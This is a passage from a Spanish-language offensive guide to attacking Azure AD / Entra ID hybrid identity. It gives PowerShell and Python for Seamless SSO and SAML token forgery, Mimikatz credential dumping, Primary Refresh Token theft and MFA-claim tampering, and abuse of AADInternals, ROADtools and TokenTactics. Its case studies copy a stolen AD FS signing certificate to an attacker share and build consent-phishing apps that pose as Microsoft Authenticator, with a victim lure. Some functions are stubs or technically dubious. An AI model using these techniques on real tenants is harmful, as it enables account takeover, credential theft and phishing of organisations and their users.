        # El ticket permite autenticarse como cualquier usuario en Azure AD
        pass

    def sso_to_azure(self, target_upn, forged_ticket):
        """Usar ticket forjado para autenticar en Azure AD"""
        import requests

        # Endpoint de autenticacion Seamless SSO
        url = "https://autologon.microsoftazuread-sso.com/{tenant_id}/windows"

        # Enviar ticket Kerberos
        headers = {
            "Authorization": f"Negotiate {base64.b64encode(forged_ticket).decode()}"
        }
        resp = requests.get(url, headers=headers)
        return resp
```

## 7. Hybrid Identity Attacks

### 7.1 [cloud](../raw/cl0ud-h4ck1ng.md)-to-On-Prem Pivot

```powershell
# Una vez comprometido Azure AD, pivotear a on-prem

# 1. Verificar si hay Azure AD Connect
Get-AzureADUser -All $true | Where-Object { $_.OnPremisesSecurityIdentifier -ne $null } | Select-Object -First 5

# 2. Encontrar servidor Azure AD Connect
Get-AzureADApplication -Filter "DisplayName eq 'Azure AD Connect'" | Select-Object *

# 3. Si tenemos Global Admin, podemos cambiar configuracion de PTA/AD FS
# y dirigir autenticaciones a un servidor controlado

# 4. Dump de credenciales sincronizadas (si PTA)
# Con acceso al servidor AAD Connect:
Start-Process -FilePath "C:\Program Files\Microsoft Azure AD Sync\Bin\miiskmu.exe"
```

### 7.2 On-Prem-to-Cloud Pivot

```powershell
# Una vez comprometido on-prem (DA), pivotear a Azure AD

# 1. Extraer hash de AZUREADSSOCC$ (si Seamless SSO)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:AZUREADSSOCC$"'

# 2. Extraer hash del conector AAD Connect
# En el servidor AAD Connect:
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# 3. Usar hash para autenticar como conector
$tenantId = "tenant-id"
$clientId = "1b730954-1685-4b74-9bfd-dac224a7b894"  # AAD Connect client ID
# Usar MSOL Helper para autenticar
```

### 7.3 DirSync Exploitation

```python
"""
DirSync exploitation - abusar de permisos de sincronizacion
El account de AAD Connect tiene permisos especiales (DirSync) 
que permiten modificar objetos sincronizados.
"""
import requests, json, base64

class DirSyncAttack:
    def __init__(self, tenant_id, access_token):
        self.tenant = tenant_id
        self.token = access_token
        self.graph = "https://graph.microsoft.com/v1.0"

    def force_password_sync(self, user_id, new_password):
        """Forzar sincronizacion de password"""
        url = f"{self.graph}/users/{user_id}"
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        }
        # Modificar password en Azure AD
        data = {
            "passwordProfile": {
                "forceChangePasswordNextSignIn": False,
                "password": new_password
            }
        }
        resp = requests.patch(url, headers=headers, json=data)
        return resp.status_code == 204

    def disable_mfa_for_user(self, user_id):
        """Deshabilitar MFA para un usuario"""
        # Si tenemos permisos de autenticacion
        url = f"{self.graph}/users/{user_id}/authentication/methods"
        # Eliminar metodos de MFA
        pass

    def set_password_never_expires(self, user_id):
        """Hacer que password nunca expire"""
        url = f"{self.graph}/users/{user_id}"
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        }
        data = {"passwordPolicies": "DisablePasswordExpiration"}
        resp = requests.patch(url, headers=headers, json=data)
        return resp.status_code == 204

    def add_user_to_privileged_role(self, user_id, role_name="Global Administrator"):
        """Agregar usuario a rol privilegiado"""
        from azure.identity import ClientSecretCredential
        from azure.mgmt.authorization import AuthorizationManagementClient

        # Obtener ID del rol
        role_ids = {
            "Global Administrator": "62e90394-69f5-4237-9190-012177145e10",
            "Exchange Administrator": "29232cdf-9323-42fd-ade2-1d097af3e4de",
            "SharePoint Administrator": "f28a1f50-f6e7-4571-818b-6a12f2af6b6c",
        }
        return role_ids.get(role_name, None)
```

## 8. Cross-Tenant Attacks

### 8.1 B2B Collaboration Abuse

```powershell
# B2B permite invitar usuarios externos como guests
# Un atacante puede abusar de B2B para acceder a recursos

# Enumerar invitaciones B2B
Get-AzureADUser -All $true | Where-Object { $_.UserType -eq "Guest" } |
    Select-Object DisplayName, UserPrincipalName, UserState

# Ver recursos compartidos con guests
Get-AzureADGroup -All $true | Where-Object {
    $_.MailEnabled -eq $false -and $_.SecurityEnabled -eq $true
} | ForEach-Object {
    $members = Get-AzureADGroupMember -ObjectId $_.ObjectId | Where-Object { $_.UserType -eq "Guest" }
    if ($members) {
        Write-Host "Group: $($_.DisplayName) tiene $($members.Count) guests"
    }
}

# Abusar de B2B: crear invitacion maliciosa
New-AzureADMSInvitation -InvitedUserEmailAddress "attacker@evil.com" `
    -InvitedUserDisplayName "Attacker" `
    -InviteRedirectUrl "https://myapps.microsoft.com" `
    -SendInvitationMessage $true
```

### 8.2 Guest User Escalation

```python
"""
Guest user escalation - abusar de permisos de invitado
"""
class GuestEscalation:
    def __init__(self, tenant_id, client_id, client_secret):
        self.tenant = tenant_id
        self.client = client_id
        self.secret = client_secret

    def enumerate_guest_resources(self, guest_token):
        """Enumerar recursos accesibles como guest"""
        import requests
        headers = {"Authorization": f"Bearer {guest_token}"}

        # Grupos accesibles
        groups = requests.get(
            "https://graph.microsoft.com/v1.0/groups",
            headers=headers
        )
        return groups.json()

    def guest_to_member(self, guest_user_id, group_id):
        """Convertir guest a member en un grupo"""
        import requests
        # Modificar el tipo de usuario en el grupo
        url = f"https://graph.microsoft.com/v1.0/groups/{group_id}/members/$ref"
        data = {
            "@odata.id": f"https://graph.microsoft.com/v1.0/directoryObjects/{guest_user_id}"
        }
        headers = {
            "Authorization": "Bearer admin_token_required",
            "Content-Type": "application/json"
        }
        # Requiere permisos de admin para modificar pertenencias

    def cross_tenant_consent_phishing(self, app_id, target_tenant):
        """Realizar consent phishing cruzado entre tenants"""
        import requests
        auth_url = f"https://login.microsoftonline.com/{target_tenant}/oauth2/v2.0/authorize"
        params = {
            "client_id": app_id,
            "response_type": "code",
            "redirect_uri": "https://attacker.com/callback",
            "scope": "https://graph.microsoft.com/.default",
            "state": "12345"
        }
        return f"{auth_url}?{'&'.join(f'{k}={v}' for k,v in params.items())}"
```

## 9. Token Manipulation

### 9.1 PRT (Primary Refresh Token) Theft

```powershell
# PRT es el token maestro de Azure AD en Windows 10/11
# Un atacante que robe el PRT puede acceder como el usuario

# Extraer PRT con mimikatz
Invoke-Mimikatz -Command '"token::elevate" "sekurlsa::cloudap"'

# Extraer PRT con ROADtools
roadrecon auth --prt-cookie "CookieValue"
roadrecon token --prt "PRTValue" --sessionkey "SessionKey"

# Verificar PRT con AADInternals
Get-AADIntUserPRT -UserPrincipalName "user@domain.com"
```

### 9.2 Session Key Extraction

```python
"""
PRT and Session Key extraction
"""
import base64, json

class PRTManipulation:
    def __init__(self):
        pass

    def parse_prt_cookie(self, prt_cookie):
        """Parsear PRT cookie de Azure AD"""
        parts = prt_cookie.split('.')
        if len(parts) >= 2:
            header = json.loads(base64.b64decode(parts[0] + '=='))
            payload = json.loads(base64.b64decode(parts[1] + '=='))
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2] if len(parts) > 2 else None
            }
        return None

    def modify_prt_claims(self, prt_cookie, new_claims):
        """Modificar claims en PRT"""
        parsed = self.parse_prt_cookie(prt_cookie)
        if not parsed:
            return None

        # Modificar payload
        parsed['payload'].update(new_claims)

        # Re-codificar (necesita session key para firma)
        header_b64 = base64.b64encode(
            json.dumps(parsed['header']).encode()
        ).decode().rstrip('=')
        payload_b64 = base64.b64encode(
            json.dumps(parsed['payload']).encode()
        ).decode().rstrip('=')

        return f"{header_b64}.{payload_b64}.{parsed['signature']}"

    def create_session_key(self, raw_key):
        """Derivar session key de PRT"""
        import hashlib
        session_key = hashlib.sha256(raw_key.encode()).digest()
        return base64.b64encode(session_key).decode()

    def forge_token_with_prt(self, prt, session_key, resource="https://graph.microsoft.com"):
        """Forjar token de acceso usando PRT y session key"""
        import requests

        # Endpoint de token de Azure AD
        url = f"https://login.microsoftonline.com/common/oauth2/token"

        # Request con PRT
        headers = {
            "x-ms-RefreshTokenCredential": prt,
            "x-ms-SessionKey": session_key
        }
        data = {
            "grant_type": "refresh_token",
            "resource": resource,
            "client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e"  # Azure PowerShell
        }

        resp = requests.post(url, headers=headers, data=data)
        return resp.json() if resp.status_code == 200 else None
```

### 9.3 MFA Claims Manipulation

```powershell
# Manipular claims de MFA en tokens
# Si tenemos el PRT, podemos modificar claims de autenticacion

# Ver claims actuales del PRT
# El PRT contiene claims como:
# - amr (authentication methods reference)
# - mfa (si se uso MFA)

# Con AADInternals:
Get-AADIntPRTClaims -PRT "PRT_VALUE"

# Modificar claims:
# Podemos agregar "mfa" claim si no se uso MFA
# Esto permite acceder a recursos que requieren MFA
```

## 10. AADInternals

### 10.1 Instalacion

```powershell
# Instalar AADInternals
Install-Module -Name AADInternals -Force

# Ver comandos disponibles
Get-Command -Module AADInternals

# Obtener informacion del tenant
Get-AADIntTenantInfo -Domain "domain.com"

# Obtener tokens
Get-AADIntAccessTokenForAADGraph
Get-AADIntAccessTokenForMSGraph
Get-AADIntAccessTokenForAzureCoreManagement
```

### 10.2 Comandos de [reconocimiento](../raw/0s1nt.md#reconocimiento)

```powershell
# Enumeracion de usuarios
Get-AADIntUsers -All $true | Select-Object UserPrincipalName, DisplayName, UserType

# Enumeracion de grupos
Get-AADIntGroups -All $true | Select-Object DisplayName, Description

# Enumeracion de aplicaciones
Get-AADIntServicePrincipals -All $true |
    Select-Object DisplayName, AppId, ServicePrincipalType

# Enumeracion de roles
Get-AADIntDirectoryRole | Select-Object DisplayName, RoleTemplateId
Get-AADIntDirectoryRoleMember -RoleName "Global Administrator"

# Enumeracion de dispositivos
Get-AADIntDevice -All $true | Select-Object DisplayName, DeviceId, TrustType

# Enumeracion de politicas de acceso condicional
Get-AADIntConditionalAccessPolicy -All $true |
    Select-Object DisplayName, State, Conditions
```

### 10.3 Ataques con AADInternals

```powershell
# Obtener PRT de un usuario (requiere credenciales)
$prt = Get-AADIntUserPRT -UserPrincipalName "user@domain.com" -Password "password"
$prt

# Obtener PRT con Session Key
$prtSession = Get-AADIntUserPRT -UserPrincipalName "user@domain.com" `
    -Password "password" -GetSessionKey
$prtSession

# Usar PRT para obtener tokens
$token = Get-AADIntAccessTokenForPRT -PRT $prt `
    -Resource "https://graph.microsoft.com" `
    -ClientId "1b730954-1685-4b74-9bfd-dac224a7b894"

# Dump de informacion del tenant
Invoke-AADIntReconAsOutsider -DomainName "domain.com"

# Dump de usuarios con acceso externo
Get-AADIntExternalUsers

# Simular ataque de consent phishing
$consent = New-AADIntConsentLink -AppName "MaliciousApp" `
    -RedirectUri "https://attacker.com/callback" `
    -Resource "https://graph.microsoft.com"

# Obtener token para Azure AD (sin MFA)
$token = Get-AADIntAccessTokenForAzureAD -UserPrincipalName "user@domain.com" -Password "password"
```

## 11. ROADtools

### 11.1 Instalacion

```bash
pip install roadtools roadrecon roadlib roadtx

# Inicializar roadrecon
roadrecon auth --device-code
roadrecon gather
roadrecon gui
```

### 11.2 Comandos de ROADtools

```bash
# Autenticacion
roadtx auth --device-code
roadtx auth --prt "PRT_VALUE"
roadtx auth --refresh-token "REFRESH_TOKEN"

# ROADrecon - recolectar informacion
roadrecon gather --tokens tokens.json
roadrecon gather --access-token "ACCESS_TOKEN"

# Analisis
roadrecon auth --prt-cookie "CookieValue"
roadrecon analyze
roadrecon gui  # Interfaz web en localhost:5000

# Token exchange
roadtx describe --token "ACCESS_TOKEN"
roadtx exchange --resource "https://graph.microsoft.com"
```

### 11.3 Hunting con ROADtools

```python
"""
ROADtools integration for hunting
"""
import requests, json

class ROADHunter:
    def __init__(self, access_token):
        self.token = access_token
        self.base = "https://graph.microsoft.com/v1.0"

    def find_privileged_users(self):
        """Encontrar usuarios con roles privilegiados"""
        headers = {"Authorization": f"Bearer {self.token}"}
        url = f"{self.base}/directoryRoles"
        roles = requests.get(url, headers=headers).json()

        privileged = []
        for role in roles.get('value', []):
            members = requests.get(
                f"{self.base}/directoryRoles/{role['id']}/members",
                headers=headers
            ).json()
            for member in members.get('value', []):
                privileged.append({
                    'role': role['displayName'],
                    'user': member.get('userPrincipalName', member.get('displayName')),
                    'id': member['id']
                })
        return privileged

    def find_apps_with_permissions(self, permission="Directory.ReadWrite.All"):
        """Encontrar apps con permisos peligrosos"""
        headers = {"Authorization": f"Bearer {self.token}"}

        apps = requests.get(
            f"{self.base}/servicePrincipals",
            headers=headers
        ).json()

        dangerous = []
        for app in apps.get('value', []):
            # Delegated permissions
            for oauth in app.get('oauth2PermissionScopes', []):
                if permission in oauth.get('value', ''):
                    dangerous.append({
                        'app': app['displayName'],
                        'app_id': app['appId'],
                        'permission': oauth['value'],
                        'type': 'delegated'
                    })

            # Application permissions
            for role in app.get('appRoles', []):
                if permission in role.get('value', ''):
                    dangerous.append({
                        'app': app['displayName'],
                        'app_id': app['appId'],
                        'permission': role['value'],
                        'type': 'application'
                    })

        return dangerous

    def find_consent_grants(self):
        """Encontrar consent grants sospechosos"""
        headers = {"Authorization": f"Bearer {self.token}"}

        grants = requests.get(
            f"{self.base}/oauth2PermissionGrants",
            headers=headers
        ).json()

        suspicious = []
        for grant in grants.get('value', []):
            # Grants with broad scopes
            scope = grant.get('scope', '')
            if 'Directory.ReadWrite.All' in scope or 'Mail.Read' in scope:
                suspicious.append({
                    'client_id': grant['clientId'],
                    'resource': grant['resourceId'],
                    'scope': scope,
                    'consent_type': grant.get('consentType', '')
                })

        return suspicious

    def find_hybrid_users(self):
        """Encontrar usuarios hibridos (sincronizados de on-prem)"""
        headers = {"Authorization": f"Bearer {self.token}"}
        users = requests.get(
            f"{self.base}/users?\$select=userPrincipalName,onPremisesSecurityIdentifier,onPremisesLastSyncDateTime,onPremisesSyncEnabled",
            headers=headers
        ).json()

        hybrid = []
        for user in users.get('value', []):
            if user.get('onPremisesSecurityIdentifier'):
                hybrid.append({
                    'user': user['userPrincipalName'],
                    'sid': user['onPremisesSecurityIdentifier'],
                    'last_sync': user.get('onPremisesLastSyncDateTime'),
                    'sync_enabled': user.get('onPremisesSyncEnabled', False)
                })

        return hybrid

## 12. TokenTactics

### 12.1 Instalacion

```powershell
git clone [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.[com](../raw/w1n-s9bsyst3ms.md#com)/fireeye/TokenTactics
cd TokenTactics
Import-Module .\TokenTactics.psd1
```

### 12.2 Comandos

```powershell
# Obtener token para diferentes recursos
Get-AzureToken -Resource MicrosoftGraph
Get-AzureToken -Resource AzureManagement
Get-AzureToken -Resource OfficeManagement
Get-AzureToken -Resource ExchangeOnline
Get-AzureToken -Resource SharePointOnline
Get-AzureToken -Resource Vault

# Usar refresh token
Get-AzureToken -RefreshToken "REFRESH_TOKEN" -Resource MicrosoftGraph

# Usar PRT
Get-AzureToken -PRT "PRT_VALUE" -Context "user@domain.com" -Resource MicrosoftGraph

# Token exchange
Convert-AzureToken -Token "ACCESS_TOKEN" -TargetResource ExchangeOnline

# Ver informacion del token
Get-TokenInfo -Token "ACCESS_TOKEN"

# Decodificar token JWT
Get-JWTDetails -Token "ACCESS_TOKEN"

# Usar token
Invoke-AzureRequest -Token "ACCESS_TOKEN" -Url "https://graph.microsoft.com/v1.0/me"
```

## 13. Stormspotter

### 13.1 Instalacion

```bash
pip install stormspotter
stormspotter server
```

### 13.2 Reconocimiento de Azure

```bash
# Iniciar reconocimiento
stormspotter -u username@domain.com -p password -t tenant_id

# Recolectar:
# - Azure subscriptions
# - Resource groups
# - Virtual machines
# - Storage accounts
# - SQL databases
# - Key Vaults
# - Network security groups
# - RBAC assignments

# Ver resultados en web (localhost:8000)
```

```python
"""
Stormspotter queries for attack path analysis
"""
class StormspotterAnalyzer:
    def __init__(self, database):
        self.db = database

    def find_privileged_identities(self):
        """Encontrar identidades con roles privilegiados en [azure](../raw/cl0ud-h4ck1ng.md#azure)"""
        query = """
        MATCH (u:User)-[r:HasRole]->(role:Role)
        WHERE role.name IN ['Owner', 'Contributor', 'User Access Administrator']
        RETURN u.name, role.name, r.scope
        """
        return self.db.run(query)

    def find_attack_paths(self):
        """Encontrar caminos de ataque de azure [ad](../raw/hybr1d-1d3nt1ty.md) a Azure resources"""
        query = """
        MATCH path = (a:AzureADUser)-[:MemberOf*1..]->(:Group)-[:HasRole]->(role:Role)-[:On]->(resource:AzureResource)
        WHERE role.name = 'Contributor'
        RETURN path
        """
        return self.db.run(query)

    def find_keyvault_access(self):
        """Encontrar quienes pueden acceder a Key Vaults"""
        query = """
        MATCH (u)-[r:HasRole]->(role:Role)-[:On]->(kv:KeyVault)
        WHERE role.name IN ['Key Vault Administrator', 'Key Vault Secrets Officer']
        RETURN u.name, role.name, kv.name
        """
        return self.db.run(query)

## 14. AzureHound

### 14.1 Instalacion

```bash
# Descargar de GitHub
wget https://github.com/BloodHoundAD/AzureHound/releases/download/v2.0/azurehound-windows-amd64.zip

# Ejecutar
azurehound -u "user@domain.com" -p "password" -t "tenant-id" collect

# Convertir a formato BloodHound
azurehound configure --bloodhound
azurehound collect --tenant-id "tenant-id" --client-id "client-id" --client-secret "secret"
```

### 14.2 [bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound) Queries para [azure](../raw/cl0ud-h4ck1ng.md#azure)

```cypher
// Encontrar usuarios con Global Admin
MATCH (u:User)-[:HasRole]->(r:Role{name:'Global Administrator'})
RETURN u.name, u.displayName

// Encontrar caminos de ataque a Azure Resources
MATCH p=(u:User)-[:HasRole]->(r:Role)-[:CanAccess]->(res:AzureResource)
RETURN p

// Encontrar Service Principals con permisos peligrosos
MATCH (sp:ServicePrincipal)-[:HasRole]->(r:Role{name:'Application Administrator'})
RETURN sp.name, sp.appId

// Encontrar usuarios con MFA deshabilitado
MATCH (u:User)
WHERE u.mfaEnabled = false
RETURN u.name, u.displayName

// Encontrar usuarios hibridos (sincronizados)
MATCH (u:User)
WHERE u.onPremisesSyncEnabled = true
RETURN u.name, u.displayName, u.onPremisesSecurityIdentifier

// Encontrar grupos dinamicos (pueden escalar privilegios)
MATCH (g:Group)
WHERE g.groupTypes CONTAINS 'DynamicMembership'
RETURN g.name, g.membershipRule

// Encontrar aplicaciones con consent grants amplios
MATCH (a:Application)-[:HasConsent]->(c:ConsentGrant)
WHERE c.scope CONTAINS 'Directory.ReadWrite.All' OR c.scope CONTAINS 'Mail.Read'
RETURN a.name, a.appId, c.scope

// Caminos de movimiento lateral
MATCH p=(u1:User)-[:MemberOf]->(g:Group)-[:HasRole]->(r:Role)-[:On]->(res:AzureResource)-[:Contains]->(vm:VirtualMachine)-[:RunsAs]->(u2:User)
RETURN p
```

## 15. Casos Practicos

### 15.1 Caso 1: PTA Agent Compromise

**Escenario:** Atacante compromete servidor con PTA Agent instalado.

```powershell
# 1. Identificar servidor PTA
Get-ADComputer -Filter {Description -like "*PTA*"} | Select-Object Name

# 2. Conectar al servidor
Enter-PSSession -ComputerName PTA-SRV01

# 3. Verificar PTA Agent
Get-Service "AzureADConnectAuthenticationAgent*"
Get-Process "AzureADConnectAuthenticationAgent*"

# 4. Interceptar trafico del agente
# El agente escucha en localhost:8080
# Las solicitudes entrantes contienen usuario y password en texto claro

# 5. Modificar comportamiento del agente
# Reemplazar el ejecutable del agente con version maliciosa
# que acepte cualquier autenticacion

# Impacto: Acceso a cualquier usuario sin password valido
```

### 15.2 Caso 2: [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) FS Token Signing Certificate Stolen

**Escenario:** Atacante con DA compromete AD FS server y roba certificado de firma.

```powershell
# 1. Extraer certificado
$cert = Get-ChildItem Cert:\LocalMachine\My\ |
    Where-Object { $_.EnhancedKeyUsageList -match "Token-Signing" }

$pwd = ConvertTo-SecureString "hacked123" -AsPlainText -Force
$cert | Export-PfxCertificate -FilePath "C:\temp\ts.pfx" -Password $pwd

# 2. Copiar a maquina de atacante
Copy-Item -Path "C:\temp\ts.pfx" -Destination "\\attacker\share\"

# 3. Forjar token SAML (Python)
python forge_saml.py --user admin@target.com --app https://app.target.com \
    --cert ts.pfx --password hacked123

# 4. Autenticar como cualquier usuario sin password
# El token forjado permite acceso a cualquier app federada
```

### 15.3 Caso 3: Seamless [sso](../raw/hybr1d-1d3nt1ty.md#sso) Abuse

**Escenario:** Atacante con DA extrae [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) de AZUREADSSOCC$ y forja tickets Kerberos.

```powershell
# 1. Extraer hash de AZUREADSSOCC$
Invoke-Mimikatz -Command '"lsadump::dcsync /user:AZUREADSSOCC$"'

# 2. Forjar ticket para cualquier usuario
# Usando el hash, forjar ticket Kerberos para admin@domain.com

# 3. Autenticar en Azure AD
# Usar el ticket forjado contra autologon.microsoftazuread-sso.com

# 4. El navegador recibe cookie de session
# Sin conocer el password del usuario!

# Impacto: Acceso a Office 365 como cualquier usuario sin password
```

### 15.4 Caso 4: Cross-Tenant Consent [phishing](../raw/ph1sh1ng.md)

**Escenario:** Atacante crea app maliciosa y logra que usuario de otro tenant de consent.

```powershell
# 1. Crear app maliciosa en tenant del atacante
New-AzureADApplication -DisplayName "Microsoft Authenticator" `
    -IdentifierUris "https://auth.microsoft.com/helper" `
    -Homepage "https://attacker.com" `
    -ReplyUrls @("https://attacker.com/callback")

# 2. Solicitar permisos amplios
$app = Get-AzureADApplication -Filter "DisplayName eq 'Microsoft Authenticator'"
$req = New-AzureADApplicationRequiredResourceAccess `
    -ResourceAppId "00000003-0000-0000-c000-000000000000" ` # Graph API
    -ResourceAccess @(
        @{id="e1fe6dd8-ba31-4d61-89e7-88639da4923c"; type="Scope"}, # Mail.Read
        @{id="741f803b-c850-494e-b5df-cde7c675a1ca"; type="Scope"}, # Mail.Send
        @{id="df021288-bdef-4463-88db-98f22de89214"; type="Role"}  # Directory.ReadWrite.All
    )

Set-AzureADApplication -ObjectId $app.ObjectId -RequiredResourceAccess $req

# 3. Generar link de consent
$authUrl = "https://login.microsoftonline.com/common/adminconsent"
$params = @{
    client_id = $app.AppId
    redirect_uri = "https://attacker.com/callback"
    state = "attacker-session"
}
$consentLink = "$authUrl?$(($params.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join '&')"

# 4. Enviar a victima
# "Para continuar usando Office 365, haga clic en este enlace para verificar su cuenta"
```

## 16. Ejercicios

### Laboratorio 1: Enumeracion de [entra id](../raw/hybr1d-1d3nt1ty.md)

```powershell
# 1. Conectar a Microsoft Graph
Connect-MgGraph -Scopes "User.Read.All,Group.Read.All,Application.Read.All"

# 2. Enumerar usuarios
Get-MgUser -All | Select-Object DisplayName, UserPrincipalName, UserType, CreatedDateTime

# 3. Enumerar grupos
Get-MgGroup -All | Select-Object DisplayName, GroupTypes, SecurityEnabled, Visibility

# 4. Enumerar aplicaciones
Get-MgApplication -All | Select-Object DisplayName, AppId, PublisherDomain

# 5. Enumerar roles
Get-MgDirectoryRole | Select-Object DisplayName, RoleTemplateId

# 6. Enumerar politicas de acceso condicional
Get-MgIdentityConditionalAccessPolicy | Select-Object DisplayName, State

# 7. Identificar usuarios sincronizados (hibridos)
Get-MgUser -All -Property UserPrincipalName, OnPremisesSecurityIdentifier, OnPremisesSyncEnabled |
    Where-Object { $_.OnPremisesSecurityIdentifier -ne $null } |
    Select-Object UserPrincipalName, OnPremisesSyncEnabled

# Preguntas:
# - Cuantos usuarios tienen rol de Global Admin?
# - Cuantas aplicaciones tienen permisos Directory.ReadWrite.All?
# - Que politicas de acceso condicional existen?
```

### Laboratorio 2: Token Manipulation

```python
"""
Token manipulation lab
"""
import requests, json, base64, jwt

class TokenLab:
    def decode_jwt(self, token):
        """Decodificar JWT token sin verificar"""
        parts = token.split('.')
        if len(parts) != 3:
            return None
        header = json.loads(base64.b64decode(parts[0] + '=='))
        payload = json.loads(base64.b64decode(parts[1] + '=='))
        return {'header': header, 'payload': payload, 'signature': parts[2]}

    def analyze_token_claims(self, token):
        """Analizar claims del token"""
        decoded = self.decode_jwt(token)
        if not decoded:
            return None

        claims = decoded['payload']

        # Claims importantes
        analysis = {
            'issuer': claims.get('iss', ''),
            'audience': claims.get('aud', ''),
            'subject': claims.get('sub', ''),
            'tenant_id': claims.get('tid', ''),
            'user': claims.get('unique_name', claims.get('upn', '')),
            'roles': claims.get('roles', []),
            'scp': claims.get('scp', '').split(' ') if claims.get('scp') else [],
            'mfa': 'mfa' in claims.get('amr', []),
            'expires': claims.get('exp', 0),
            'not_before': claims.get('nbf', 0),
        }

        return analysis

    def check_token_validity(self, token):
        """Verificar si token es valido (no expirado)"""
        import time
        decoded = self.decode_jwt(token)
        if not decoded:
            return False

        now = int(time.time())
        exp = decoded['payload'].get('exp', 0)
        nbf = decoded['payload'].get('nbf', 0)

        return nbf <= now <= exp

    def use_token_for_graph(self, token):
        """Usar token para consultar Microsoft Graph"""
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }

        resp = requests.get(
            "https://graph.microsoft.com/v1.0/me",
            headers=headers
        )

        if resp.status_code == 200:
            return resp.json()
        else:
            return {"error": resp.status_code, "message": resp.text}

# Lab exercises:
lab = TokenLab()

# 1. Decodificar un token JWT
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL2xvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20vIiwic3ViIjoiMTIzNDU2Nzg5MCIsImF1ZCI6Imh0dHBzOi8vZ3JhcGgubWljcm9zb2Z0LmNvbS8iLCJ1cG4iOiJ1c2VyQGRvbWFpbi5jb20iLCJ0aWQiOiJ0ZW5hbnQtaWQifQ.signature"
analysis = lab.analyze_token_claims(token)
print(json.dumps(analysis, indent=2))

# 2. Probar token contra Graph API
# result = lab.use_token_for_graph("YOUR_TOKEN")
# print(result)

# 3. Analizar roles y permisos
# Ejercicio: Identificar que permisos tiene un token dado
```

### Laboratorio 3: AADInternals [recon](../raw/0s1nt.md#reconocimiento)

```powershell
# 1. Cargar modulo
Import-Module AADInternals

# 2. Reconocimiento externo (sin credenciales)
Invoke-AADIntReconAsOutsider -DomainName "targetdomain.com"

# 3. Obtener informacion del tenant
Get-AADIntTenantInfo -Domain "targetdomain.com"

# 4. Enumerar usuarios
Get-AADIntUsers -All $true | Select-Object UserPrincipalName, DisplayName, UserType, AccountEnabled

# 5. Enumerar grupos
Get-AADIntGroups -All $true | Select-Object DisplayName, SecurityEnabled, MailEnabled

# 6. Enumerar roles
Get-AADIntDirectoryRole | Select-Object DisplayName
Get-AADIntDirectoryRoleMember -RoleName "Global Administrator" |
    Select-Object UserPrincipalName, DisplayName

# 7. Enumerar aplicaciones
Get-AADIntServicePrincipals -All $true |
    Select-Object DisplayName, AppId, ServicePrincipalType, PasswordCredentials

# 8. Buscar usuarios sin MFA
$users = Get-AADIntUsers -All $true
$users | Where-Object { $_.StrongAuthenticationRequirements -eq $null } |
    Select-Object UserPrincipalName, DisplayName
```

### Laboratorio 4: [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) FS Attack Simulation

```bash
# 1. Configurar laboratorio AD FS
# Simular servidor AD FS en VM

# 2. Identificar endpoints AD FS
nmap -sV -p 443,49443 adfs.targetdomain.com

# 3. Enumerar relying parties
# https://adfs.targetdomain.com/adfs/ls/idpinitiatedsignon.htm
# https://adfs.targetdomain.com/FederationMetadata/2007-06/FederationMetadata.xml

# 4. Analizar metadata de federacion
curl -k https://adfs.targetdomain.com/FederationMetadata/2007-06/FederationMetadata.xml

# 5. Extraer certificados del metadata
python3 << 'EOF'
import xml.etree.ElementTree as ET
import requests

resp = requests.get("https://adfs.targetdomain.com/FederationMetadata/2007-06/FederationMetadata.xml", verify=False)
root = ET.fromstring(resp.content)
ns = {"ds": "http://www.w3.org/2000/09/xmldsig#"}

for cert in root.iter("{http://www.w3.org/2000/09/xmldsig#}X509Certificate"):
    print(f"Certificado encontrado:")
    print(cert.text)
    print()
EOF
```

### Laboratorio 5: Token Exchange Chain

```python
"""
Token exchange chain: obtener nuevo token para diferentes recursos
"""
import requests, base64, json

class TokenExchange:
    def exchange_prt_for_access_token(self, prt, session_key, resource):
        """Intercambiar PRT por token de acceso"""
        url = "https://login.microsoftonline.com/common/oauth2/token"
        headers = {
            "x-ms-RefreshTokenCredential": prt,
            "x-ms-SessionKey": session_key,
            "User-Agent": "Windows-AzureAD-Authentication-Provider/1.0"
        }
        data = {
            "grant_type": "refresh_token",
            "resource": resource,
            "client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e"
        }
        resp = requests.post(url, headers=headers, data=data)
        return resp.json()

    def exchange_access_for_access(self, access_token, target_resource):
        """On-Behalf-Of flow para cambiar recurso"""
        url = f"https://login.microsoftonline.com/common/oauth2/token"
        data = {
            "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
            "assertion": access_token,
            "resource": target_resource,
            "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
            "requested_token_use": "on_behalf_of"
        }
        resp = requests.post(url, data=data)
        return resp.json()

    def exchange_refresh_for_access(self, refresh_token, resource):
        """Intercambiar refresh token por access token"""
        url = "https://login.microsoftonline.com/common/oauth2/token"
        data = {
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "resource": resource,
            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894"
        }
        resp = requests.post(url, data=data)
        return resp.json()

    def get_resources(self):
        """Lista de resources que podemos solicitar"""
        return {
            "Microsoft Graph": "https://graph.microsoft.com",
            "Azure Management": "https://management.azure.com",
            "Office 365": "https://outlook.office.com",
            "SharePoint": "https://yourtenant.sharepoint.com",
            "Exchange Online": "https://outlook.office365.com",
            "Azure Key Vault": "https://vault.azure.net",
            "Intune": "https://api.manage.microsoft.com",
            "Power BI": "https://analysis.windows.net/powerbi/api"
        }

    def get_all_tokens(self, prt, session_key):
        """Obtener tokens para todos los recursos"""
        tokens = {}
        for name, resource in self.get_resources().items():
            token = self.exchange_prt_for_access_token(prt, session_key, resource)
            if 'access_token' in token:
